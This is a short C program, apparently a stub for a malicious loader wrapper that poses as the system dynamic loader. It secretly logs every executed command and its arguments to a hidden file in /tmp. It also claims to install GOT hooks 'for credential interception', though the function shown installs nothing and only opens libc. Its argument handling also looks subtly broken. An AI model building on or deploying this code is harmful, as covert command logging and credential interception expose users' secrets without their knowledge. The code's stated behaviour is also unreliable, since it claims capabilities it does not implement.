#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <string.h>
#include <elf.h>
#include <sys/stat.h>
#include <dlfcn.h>

#define LOG_FILE "/tmp/.system_loader.log"

void log_execution(const char* binary_path, char** argv) {
    FILE* log = fopen(LOG_FILE, "a");
    if (log) {
        fprintf(log, "[LOADER] Executing: %s with args: ", binary_path);
        for (int i = 0; argv[i]; i++) {
            fprintf(log, "%s ", argv[i]);
        }
        fprintf(log, "\n");
        fclose(log);
    }
}

void install_got_hooks() {
    void* libc_handle = dlopen("libc.so.6", RTLD_LAZY);
    if (!libc_handle) {
        return;
    }
    
    FILE* log = fopen(LOG_FILE, "a");
    if (log) {
        fprintf(log, "[LOADER] GOT hooks installed for credential interception\n");
        fclose(log);
    }
}

int main(int argc, char* argv[], char* envp[]) {
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <binary> [args...]\n", argv[0]);
        return 1;
    }
    
    log_execution(argv[1], &argv[1]);
    install_got_hooks();
    
    char* real_loader = "/lib64/ld-linux-x86-64.so.2";
    
    execve(real_loader, argv, envp);
    
    perror("execve failed");
    return 1;
}